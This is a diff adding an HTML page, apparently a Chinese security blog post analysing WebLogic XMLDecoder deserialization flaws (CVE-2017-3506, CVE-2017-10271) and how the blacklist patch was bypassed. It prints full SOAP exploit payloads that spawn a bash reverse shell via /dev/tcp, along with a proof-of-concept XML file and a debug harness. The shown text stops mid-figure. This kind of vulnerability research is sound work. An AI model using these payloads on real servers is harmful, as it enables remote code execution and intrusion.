@@ -1,0 +1,1122 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="9I2ZJGCGSFZ3JOIR2o2ugq8lnm-NLadndUPsCsXXgFc">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="xmldecoder java cve-2019-2725">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="从cve-2017-3506谈起2017年4月weblogic官方发布了一个补丁http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html 官方说这洞主要是web service模块的问题，那我们来动态调试一下exp12345678910111213141516171819202122&amp;lt;soapenv">
+<meta name="keywords" content="xmldecoder java cve-2019-2725">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xmldecoder反序列化的补丁与绕过">
+<meta property="og:url" content="http://pupiles.com/xmldecoder.html">
+<meta property="og:site_name" content="Pupiles blog">
+<meta property="og:description" content="从cve-2017-3506谈起2017年4月weblogic官方发布了一个补丁http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html 官方说这洞主要是web service模块的问题，那我们来动态调试一下exp12345678910111213141516171819202122&amp;lt;soapenv">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_15-22-24.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_15-27-25.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/WechatIMG6.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-02-27.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-06-50.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-08-42.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-11-09.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-33-34.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-35-03.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_16-38-32.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-01-20.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-11-34.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-15-30.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-19-23.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-49-58.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-59-59.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_18-00-11.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_20-35-04.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-36-57.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_17-50-20.png">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_19-20-46.png">
+<meta property="og:updated_time" content="2019-05-02T12:39:48.284Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xmldecoder反序列化的补丁与绕过">
+<meta name="twitter:description" content="从cve-2017-3506谈起2017年4月weblogic官方发布了一个补丁http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html 官方说这洞主要是web service模块的问题，那我们来动态调试一下exp12345678910111213141516171819202122&amp;lt;soapenv">
+<meta name="twitter:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_15-22-24.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://pupiles.com/xmldecoder.html">
+
+
+
+
+
+  <title> xmldecoder反序列化的补丁与绕过 | Pupiles blog </title>
+</head>
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?a5cad5e7b7a8b5d3aea9f10d80c9f2b7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pupiles blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">菜的要死的程序猿和Web狗</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <div class="algolia-popup popup search-popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://pupiles.com/xmldecoder.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pupil">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/touxiang.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pupiles blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                xmldecoder反序列化的补丁与绕过
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-02T20:56:22+08:00">
+                2019-05-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/learning/" itemprop="url" rel="index">
+                    <span itemprop="name">learning</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a class="cloud-tie-join-count" href="/xmldecoder.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count join-count" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/xmldecoder.html" class="leancloud_visitors" data-flag-title="xmldecoder反序列化的补丁与绕过">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="从cve-2017-3506谈起"><a href="#从cve-2017-3506谈起" class="headerlink" title="从cve-2017-3506谈起"></a>从cve-2017-3506谈起</h2><p>2017年4月weblogic官方发布了一个补丁<br><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html</a></p>
+<p>官方说这洞主要是web service模块的问题，那我们来动态调试一下<br>exp<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_15-22-24.png" alt="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_15-22-24.png"><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/2333 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>看一下调用栈<br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/Snipaste_2019-05-02_15-27-25.png" alt=""><br>所以最终我们的payload会调用进行readobject反序列化<br>然而这个readobject确实XMLDecoder的一个方法，而这个XMLDecoder却不是weblogic特有的类而是java的一个通用类</p>
+<p>所以很容易就能发现这洞本质并不是weblogic的问题，但是weblogic确实对其进行了修补，方法很粗暴<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
+<p>简单来说就是限制了object标签，使其不能使用object创建指定类的实例，然而这种黑名单修补方法实在是太憨憨了，所以就有了CVE-2017-10271</p>
+<h3 id="cve-2017-10271"><a href="#cve-2017-10271" class="headerlink" title="cve-2017-10271"></a>cve-2017-10271</h3><p>exp<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/2333 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我们可以看到这里我们使用了void来代替object来绕过了黑名单过滤，当然后续不止void还可以使用new关键词来代替object，不知道大家看到这exp的时候有没有疑惑，为什么void元素和new元素可以代替object呢?这是XMLDecoder的问题还是weblogic的问题?还有没有别的元素也可以被特殊处理呢?带着这些疑问上网查了一下，然而网上大部分都是你抄我，他抄你的基本都是跟踪到readobject就结束了，所以无奈之下我问了一下chybeta师傅，他给了我一个链接<br><a href="https://docs.oracle.com/javase/9/docs/api/java/beans/XMLEncoder.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/9/docs/api/java/beans/XMLEncoder.html</a><br><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/xml/WechatIMG6.png" alt=""><br>然而这段英文我不管是读原文还是用谷歌翻译成中文都无法理解(吃了没文化的亏)，所以绝知此事还得动态调试<br>这里因为我已经知道问题大致出在了XMLDecoder里面，所以就把XMLDecoder拉出来单独调试了<br>xmlDecode<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.xdsec;</span><br><span class="line"><span class="keyword">import</span> com.sun.beans.decoder.DocumentHandler;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.helpers.DefaultHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParser;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.SAXParserFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.beans.XMLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">xmlDecode</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">XMLDecode_Deserialize</span><span class="params">(String path)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(path);</span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">        BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(fis);</span><br><span class="line">        XMLDecoder xdsec = <span class="keyword">new</span> XMLDecoder(bis);</span><br><span class="line">        xdsec.readObject();</span><br><span class="line">        xdsec.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String path = <span class="string">"src/poc.xml"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            XMLDecode_Deserialize(path);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>poc.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span 